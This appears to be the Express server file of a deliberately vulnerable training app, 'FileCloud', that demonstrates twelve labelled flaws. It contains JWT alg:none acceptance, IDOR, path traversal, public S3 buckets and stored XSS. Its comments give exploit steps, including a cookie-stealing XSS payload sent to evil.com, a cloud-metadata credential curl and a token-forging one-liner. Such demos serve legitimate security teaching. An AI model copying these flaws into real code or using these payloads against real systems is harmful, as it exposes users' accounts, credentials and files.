/**
 * FileCloud — Cloud File Storage SaaS (Educational Security Demo)
 * ================================================================
 * Scenario: FileCloud is a small-business cloud storage platform where
 * employees upload, share, and manage company documents. It uses JWT-based
 * authentication backed by SQLite, and stores files in AWS S3.
 *
 * ⚠️  INTENTIONAL VULNERABILITIES — FOR EDUCATIONAL USE ONLY ⚠️
 *
 * This application contains the following deliberately introduced flaws:
 *
 *  V1  — Session Fixation          (OWASP A07:2025 — Auth Failures)
 *  V2  — JWT Algorithm Confusion   (OWASP A02:2025 — Cryptographic Failures)
 *  V3  — IDOR via JWT user_id      (OWASP A01:2025 — Broken Access Control)
 *  V4  — S3 Bucket Public-Read     (OWASP A05:2025 — Security Misconfiguration)
 *  V5  — Default Credentials       (OWASP A05:2025 — Security Misconfiguration)
 *  V6  — Path Traversal            (OWASP A01:2025 — Broken Access Control)
 *  V7  — IDOR on File Delete       (OWASP A01:2025 — Broken Access Control)
 *  V8  — ReDoS                     (OWASP A05:2025 — Security Misconfiguration)
 *  V9  — JSON Type Confusion       (OWASP A03:2025 — Injection)
 *  V10 — Stored XSS via Activity   (OWASP A03:2025 — Injection)
 *  V11 — Supply Chain (internal-logic package)  (OWASP A06:2025)
 *  V12 — Verbose Error Disclosure  (OWASP A10:2025 — SSRF/Logging)
 */

"use strict";

const express        = require("express");
const session        = require("express-session");
const jwt            = require("jsonwebtoken");
const bcrypt         = require("bcryptjs");
const multer         = require("multer");
const multerS3       = require("multer-s3");
const { S3Client, GetObjectCommand, DeleteObjectCommand, ListObjectsV2Command } = require("@aws-sdk/client-s3");
const { getSignedUrl } = require("@aws-sdk/s3-request-presigner");
const fs             = require("fs");
const path           = require("path");

// --- VULN V11: Supply Chain — internal-logic package ---
// This package simulates a dependency confusion attack. In a real scenario,
// an attacker publishes a malicious npm package with the same name as this
// internal package, which gets installed instead of the legitimate one.
const internalCheck = require("./internal-logic/index.js");
internalCheck();

const {
  getUserByUsername, getUserById, getAllUsers,
  createUser, deleteUser, logActivity, getActivityLog, db
} = require("./database");

// ── Configuration ────────────────────────────────────────────────────────────

// --- VULN V2: Weak JWT secret — brute-forceable with tools like hashcat/jwt_tool ---
const JWT_SECRET = "secret123";

// S3 Configuration — reads from environment variables (set in EC2 user-data or .env)
// --- VULN V4: S3 bucket is configured with public-read ACL (see upload middleware) ---
const S3_BUCKET  = process.env.S3_BUCKET  || "filecloud-uploads-demo";
const AWS_REGION = process.env.AWS_REGION || "us-east-1";

const s3 = new S3Client({
  region: AWS_REGION,
  // Credentials come from EC2 instance role or environment variables
  // VULN: If the EC2 instance role has overly permissive S3 policies, an attacker
  // who gains SSRF access can steal credentials from the metadata endpoint:
  // curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
});

// ── Express Setup ────────────────────────────────────────────────────────────

const app = express();
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static("public"));

// --- VULN V1: Session Fixation ---
// The session middleware accepts a session ID supplied via the `sid` query
// parameter. An attacker can:
//   1. Generate a known session ID
//   2. Trick the victim into visiting: /login?sid=ATTACKER_KNOWN_ID
//   3. After the victim logs in, the attacker uses the same session ID
//      to access the victim's authenticated session.
//
// Additionally, resave:true + saveUninitialized:true means sessions persist
// even before login, and the session ID is never regenerated on login.
app.use((req, res, next) => {
  // VULNERABLE: honour attacker-supplied session ID from query string
  if (req.query.sid) {
    req.headers.cookie = `connect.sid=s%3A${req.query.sid}.placeholder`;
  }
  next();
});

app.use(session({
  secret: "session-secret-weak",   // VULN: weak session secret
  resave: true,
  saveUninitialized: true,
  cookie: {
    httpOnly: false,   // VULN: httpOnly:false allows JS to read the cookie → XSS cookie theft
    secure: false,     // VULN: secure:false sends cookie over HTTP (no HTTPS required)
    maxAge: 24 * 60 * 60 * 1000
  }
}));

// ── Multer / S3 Upload ───────────────────────────────────────────────────────

// --- VULN V4: S3 Misconfiguration ---
// Files are uploaded with ACL: "public-read", meaning anyone with the S3 URL
// can download any file without authentication. Combined with predictable
// key names (username/filename), an attacker can enumerate and download
// other users' files directly from S3 without going through the app.
//
// Exploit:
//   https://s3.amazonaws.com/<bucket>/<username>/<filename>
//   Enumerate: aws s3 ls s3://<bucket>/ --no-sign-request
//
// Fallback to local disk if S3 is not configured (for local dev)
let upload;
const S3_ENABLED = !!(process.env.S3_BUCKET);

if (S3_ENABLED) {
  upload = multer({
    storage: multerS3({
      s3,
      bucket: S3_BUCKET,
      // VULN: public-read ACL — every uploaded file is publicly accessible
      acl: "public-read",
      // VULN: key uses username from JWT body (attacker can forge username via IDOR)
      key: (req, file, cb) => {
        const username = req.jwtUser ? req.jwtUser.username : "anonymous";
        cb(null, `${username}/${file.originalname}`);
      }
    })
  });
} else {
  // Local disk fallback
  const diskStorage = multer.diskStorage({
    destination: (req, file, cb) => {
      const username = req.jwtUser ? req.jwtUser.username : (req.body.username || "anonymous");
      const dir = path.join(__dirname, "uploads", username);
      fs.mkdirSync(dir, { recursive: true });
      cb(null, dir);
    },
    filename: (req, file, cb) => cb(null, file.originalname)
  });
  upload = multer({ storage: diskStorage });
}

// ── JWT Middleware ───────────────────────────────────────────────────────────

// --- VULN V2: JWT Algorithm Confusion (alg:none bypass) ---
// The verifyJWT middleware uses { algorithms: ["HS256", "none"] }, which means
// an attacker can craft a token with alg:"none" and no signature, and the
// server will accept it as valid.
//
// Exploit steps:
//   1. Log in as alice → receive JWT
//   2. Decode the JWT payload (base64): {"user_id":1,"username":"alice","role":"user"}
//   3. Modify payload: {"user_id":2,"username":"bob","role":"user"}
//      OR escalate:    {"user_id":3,"username":"admin","role":"admin"}
//   4. Re-encode with alg:"none" and empty signature:
//      eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.<modified_payload>.
//   5. Send as Authorization: Bearer <forged_token>
//   6. Server accepts it → attacker is now authenticated as any user
//
// Tool: jwt_tool.py -t <token> -X a   (alg:none attack)
//       python3 -c "import base64,json; h=base64.b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).decode().rstrip('='); p=base64.b64encode(json.dumps({'user_id':3,'username':'admin','role':'admin'}).encode()).decode().rstrip('='); print(f'{h}.{p}.')"

function verifyJWT(req, res, next) {
  const authHeader = req.headers["authorization"];
  const tokenFromCookie = req.session.token;
  const token = (authHeader && authHeader.startsWith("Bearer "))
    ? authHeader.slice(7)
    : tokenFromCookie;

  if (!token) return res.status(401).json({ error: "No token" });

  try {
    // VULNERABLE: "none" algorithm accepted
    const decoded = jwt.verify(token, JWT_SECRET, { algorithms: ["HS256", "none"] });
    req.jwtUser = decoded;
    next();
  } catch (e) {
    return res.status(401).json({ error: "Invalid token" });
  }
}

// Soft JWT check — populates req.jwtUser if token present, doesn't block
function softJWT(req, res, next) {
  const token = req.session.token || (req.headers["authorization"] || "").slice(7);
  if (token) {
    try {
      req.jwtUser = jwt.verify(token, JWT_SECRET, { algorithms: ["HS256", "none"] });
    } catch (_) {}
  }
  next();
}

// ── Auth Routes ──────────────────────────────────────────────────────────────

// POST /login
// --- VULN V9: JSON Type Confusion ---
// If Content-Type: application/json and password is sent as boolean true,
// bcrypt.compareSync(true, hash) returns false — but if an attacker sends
// username as "__proto__" it can pollute Object.prototype.
// Also: no input type validation means non-string values reach bcrypt.
//
// --- VULN V1: Session Fixation ---
// Session ID is NOT regenerated after login. If attacker pre-set a session ID
// via ?sid=, they now share the authenticated session with the victim.
app.post("/login", (req, res) => {
  let { username, password } = req.body;

  // VULN V9: no type validation — allows prototype pollution and type confusion
  if (typeof username !== "string" || typeof password !== "string") {
    // Intentionally weak: still attempts lookup instead of rejecting
    username = String(username);
    password = String(password);
  }

  const user = getUserByUsername(username);
  if (!user || !bcrypt.compareSync(password, user.password)) {
    return res.status(401).send(`Invalid credentials <a href='/login.html'>Back</a>`);
  }

  // VULN V1: session ID NOT regenerated — session fixation possible
  // Fix would be: req.session.regenerate(...)
  req.session.userId   = user.id;
  req.session.username = user.username;
  req.session.role     = user.role;

  // Issue JWT
  // --- VULN V3: IDOR via JWT payload ---
  // The JWT contains user_id as a plain integer. Because the secret is weak
  // and alg:none is accepted, an attacker can forge tokens with any user_id.
  // The /api/profile/:id endpoint uses this user_id directly without checking
  // if it matches the authenticated user — classic IDOR.
  const token = jwt.sign(
    { user_id: user.id, username: user.username, role: user.role },
    JWT_SECRET,
    { algorithm: "HS256", expiresIn: "8h" }
  );

  req.session.token = token;

  logActivity(user.id, user.username, "login", req.ip);

  if (user.role === "admin") {
    return res.redirect(`/admin.html`);
  }
  res.redirect(`/dashboard.html`);
});

// POST /signup
app.post("/signup", (req, res) => {
  const { username, password, email } = req.body;
  if (!username || !password)
    return res.status(400).send("Username and password required");

  if (getUserByUsername(username))
    return res.status(409).send(`User exists <a href='/login.html'>Login</a>`);

  // VULN: role can be set by the user if they send role=admin in the form body
  // This is a Mass Assignment vulnerability
  const role = req.body.role === "admin" ? "admin" : "user";
  createUser(username, password, role, email);

  res.send(`Account created for ${username}. <a href='/login.html'>Login</a>`);
});

// GET /logout
app.get("/logout", (req, res) => {
  req.session.destroy();
  res.redirect("/login.html");
});

// GET /api/me — returns current user info from JWT
app.get("/api/me", verifyJWT, (req, res) => {
  const user = getUserById(req.jwtUser.user_id);
  if (!user) return res.status(404).json({ error: "User not found" });
  res.json({ id: user.id, username: user.username, role: user.role, email: user.email });
});

// GET /api/token — returns the current JWT (for demo/educational purposes)
// VULN: exposes the token in a JSON response — makes it easy to steal via XSS
app.get("/api/token", (req, res) => {
  const token = req.session.token;
  if (!token) return res.status(401).json({ error: "Not logged in" });
  res.json({ token });
});

// ── IDOR: Profile Access by user_id ─────────────────────────────────────────

// GET /api/profile/:id
// --- VULN V3: IDOR via JWT user_id ---
// The endpoint accepts any :id in the URL and returns that user's profile.
// There is NO check that req.jwtUser.user_id === parseInt(id).
// An attacker who is logged in as alice (user_id=1) can request:
//   GET /api/profile/3   → gets admin's profile
//   GET /api/profile/2   → gets bob's profile
//
// Combined with JWT alg:none, attacker can also forge the token to claim
// they are user_id=3 and then access admin-only endpoints.
app.get("/api/profile/:id", verifyJWT, (req, res) => {
  const targetId = parseInt(req.params.id);
  // VULNERABLE: no ownership check
  const user = getUserById(targetId);
  if (!user) return res.status(404).json({ error: "User not found" });
  res.json({ id: user.id, username: user.username, role: user.role, email: user.email });
});

// ── File Routes ──────────────────────────────────────────────────────────────

// POST /upload — upload file to S3 (or local disk)
app.post("/upload", verifyJWT, upload.single("file"), (req, res) => {
  const username = req.jwtUser.username;
  let fileUrl;

  if (S3_ENABLED && req.file && req.file.location) {
    // S3 URL — VULN V4: this is a public URL, no auth required to access it
    fileUrl = req.file.location;
  } else if (req.file) {
    fileUrl = `/uploads/${username}/${req.file.originalname}`;
  }

  logActivity(req.jwtUser.user_id, username, `uploaded file: ${req.file ? req.file.originalname : "unknown"}`, req.ip);
  res.redirect("/dashboard.html");
});

// GET /files — list files for a user
// --- VULN V3/V7: IDOR — user param not validated against JWT ---
// Any authenticated user can list files of any other user by changing ?user=
// e.g. GET /files?user=admin  → lists admin's files
app.get("/files", verifyJWT, (req, res) => {
  // VULNERABLE: uses query param instead of JWT identity
  const user = req.query.user || req.jwtUser.username;

  if (S3_ENABLED) {
    s3.send(new ListObjectsV2Command({ Bucket: S3_BUCKET, Prefix: `${user}/` }))
      .then(data => {
        const files = (data.Contents || []).map(obj => ({
          name: obj.Key.replace(`${user}/`, ""),
          size: obj.Size,
          url: `https://${S3_BUCKET}.s3.${AWS_REGION}.amazonaws.com/${obj.Key}`
        }));
        res.json(files);
      })
      .catch(err => {
        // VULN V12: verbose error disclosure — stack trace returned to client
        res.status(500).json({ error: err.message, stack: err.stack });
      });
  } else {
    const dir = path.join(__dirname, "uploads", user);
    // VULN V12: no try/catch — crashes request with full stack trace if dir missing
    res.json(fs.readdirSync(dir).map(f => ({ name: f, url: `/uploads/${user}/${f}` })));
  }
});

// GET /download — download a file
// --- VULN V6: Path Traversal ---
// No sanitization of the `file` parameter. Attacker can escape uploads/ dir:
//   GET /download?user=alice&file=../../database.js
//   GET /download?user=alice&file=../../app.js
//   GET /download?user=alice&file=../../filecloud.db  (SQLite DB with all passwords!)
app.get("/download", softJWT, (req, res) => {
  const { user, file } = req.query;
  if (!user || !file) return res.status(400).send("Missing parameters");

  if (S3_ENABLED) {
    // S3 path traversal: key is constructed without sanitization
    const key = `${user}/${file}`;
    getSignedUrl(s3, new GetObjectCommand({ Bucket: S3_BUCKET, Key: key }), { expiresIn: 60 })
      .then(url => res.redirect(url))
      .catch(err => res.status(500).json({ error: err.message }));
  } else {
    // VULNERABLE: path.join does not block ../ traversal
    const filePath = path.join(__dirname, "uploads", user, file);
    res.download(filePath);
  }
});

// POST /delete — delete a file
// --- VULN V7: IDOR — no ownership check ---
// Any authenticated user can delete any other user's files by supplying
// a different username in the request body.
app.post("/delete", verifyJWT, (req, res) => {
  const { username, filename } = req.body;
  if (!username || !filename)
    return res.status(400).json({ error: "Missing data" });

  // VULNERABLE: username from body, not from JWT
  logActivity(req.jwtUser.user_id, req.jwtUser.username, `deleted file: ${filename} (owner: ${username})`, req.ip);

  if (S3_ENABLED) {
    s3.send(new DeleteObjectCommand({ Bucket: S3_BUCKET, Key: `${username}/${filename}` }))
      .then(() => res.json({ success: true }))
      .catch(err => res.status(500).json({ error: err.message }));
  } else {
    const filePath = path.join(__dirname, "uploads", username, filename);
    if (fs.existsSync(filePath)) fs.unlinkSync(filePath);
    res.json({ success: true });
  }
});

// ── Search (ReDoS) ───────────────────────────────────────────────────────────

// POST /search
// --- VULN V8: ReDoS ---
// User-supplied regex compiled directly with new RegExp(pattern).
// PoC: {"pattern":"^(a+)+$","username":"alice"} then test with "aaaaaaaab"
app.post("/search", verifyJWT, (req, res) => {
  const { pattern, username } = req.body;
  if (!pattern || !username)
    return res.status(400).json({ error: "Missing data" });

  const dir = path.join(__dirname, "uploads", username);
  if (!fs.existsSync(dir)) return res.json([]);

  const files = fs.readdirSync(dir);
  // VULNERABLE: user-controlled regex, no timeout, no safe-regex check
  const regex = new RegExp(pattern);
  const matches = files.filter(f => regex.test(f));
  res.json(matches);
});

// ── Activity Log (Stored XSS) ────────────────────────────────────────────────

// POST /activity
// --- VULN V10: Stored XSS ---
// Raw user-supplied action strings stored in DB and rendered with innerHTML
// on the admin panel. Any user can inject a script payload that executes
// in the browser of any admin who views the activity log.
//
// Exploit:
//   POST /activity  body: {"username":"alice","action":"<img src=x onerror=\"fetch('https://evil.com?c='+document.cookie)\">"}
//   Admin visits /admin.html → script executes → session cookie stolen
app.post("/activity", (req, res) => {
  const { username, action } = req.body;
  if (!username || !action)
    return res.status(400).json({ error: "Missing data" });

  // VULNERABLE: raw user input stored, no sanitization
  logActivity(null, username, action, req.ip);
  res.json({ success: true });
});

// GET /activity
app.get("/activity", (req, res) => {
  // VULN: auth check relies on x-role header — client-controlled
  const role = req.headers["x-role"] || (req.jwtUser && req.jwtUser.role);
  if (role !== "admin")
    return res.status(403).json({ error: "Forbidden" });

  // Returns unsanitized entries — admin UI renders with innerHTML → XSS
  res.json(getActivityLog());
});

// ── Admin Routes ─────────────────────────────────────────────────────────────

// GET /admin/users
app.get("/admin/users", verifyJWT, (req, res) => {
  // VULN: role check uses JWT payload which can be forged (alg:none)
  if (req.jwtUser.role !== "admin")
    return res.status(403).json({ error: "Forbidden" });

  const users = getAllUsers();
  const info = users.map(u => {
    const dir = path.join(__dirname, "uploads", u.username);
    let fileCount = 0, totalSize = 0;
    if (fs.existsSync(dir)) {
      const files = fs.readdirSync(dir);
      fileCount = files.length;
      totalSize = files.reduce((acc, f) => {
        try { return acc + fs.statSync(path.join(dir, f)).size; } catch { return acc; }
      }, 0);
    }
    return { ...u, fileCount, totalSizeKB: Math.round(totalSize / 1024) };
  });

  res.json(info);
});

// POST /admin/delete
app.post("/admin/delete", verifyJWT, (req, res) => {
  if (req.jwtUser.role !== "admin")
    return res.status(403).json({ error: "Forbidden" });

  const { targetUser } = req.body;
  deleteUser(targetUser);

  const dir = path.join(__dirname, "uploads", targetUser);
  if (fs.existsSync(dir)) fs.rmSync(dir, { recursive: true, force: true });

  logActivity(req.jwtUser.user_id, req.jwtUser.username, `deleted user: ${targetUser}`, req.ip);
  res.json({ success: true });
});

// ── Static file serving ──────────────────────────────────────────────────────

app.use("/uploads", express.static(path.join(__dirname, "uploads")));

// ── Start ────────────────────────────────────────────────────────────────────

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`FileCloud running on port ${PORT}`);
  console.log(`S3 storage: ${S3_ENABLED ? `enabled (bucket: ${S3_BUCKET})` : "disabled (local disk)"}`);
});
